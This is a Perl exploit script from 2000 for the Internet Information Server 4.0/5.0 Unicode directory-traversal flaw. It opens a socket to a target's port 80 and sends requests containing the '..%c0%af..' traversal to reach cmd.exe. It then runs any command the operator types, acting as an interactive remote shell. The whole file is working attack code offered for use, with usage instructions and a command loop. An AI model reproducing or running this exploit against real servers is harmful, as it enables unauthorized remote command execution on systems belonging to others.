#!/usr/bin/perl 
##
##  [Internet Information Server 4.0/5.0 Unicode Exploit]
##  (C) 2000 - Yo_Soy <yo_soy@raza-mexicana.org>
##
##  This program will execute commands on a IIS Unicode vulnerable
##  server. You can use it like cmd /c shell, type quit to exit.
##
##  [ http://www.raza-mexicana.org ]                     [-MEXICO-]
###################################################################
## 
use Socket;

print ("\nInternet Information Server 4.0/5.0 Unicode Exploit\n");
print ("(C) 2000 - Yo_Soy <yo_soy\@raza-mexicana.org>\n\n");
die   ("Usage: $0 <host>\n") if (!$ARGV[0]);
print ("Type quit to exit.\n\n");

while (1) {
   print ("command> ");
   $comando = <STDIN>;
   chomp ($comando);
   die ("Exiting...\n") if ($comando eq "quit");
   $comando =~ s/\s/\+/g;
   $NETFD = conexion($ARGV[0]);
   send ($NETFD, "GET /scripts/..\%c0%af../winnt/system32/cmd.exe?/c+".
        "$comando HTTP/1.0\n\n", 0);
   sysread ($NETFD, $salida, 300);
   print ("$salida\n"); }

sub conexion { 
   $iaddr = inet_aton($_[0]) || die ("Invalid host $_[0]\n");
   $paddr = sockaddr_in("80", $iaddr);
   socket  (CONNFD, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
   connect (CONNFD, $paddr) || die ("Couldn't connect $_[0]:80\n");
   return CONNFD; }
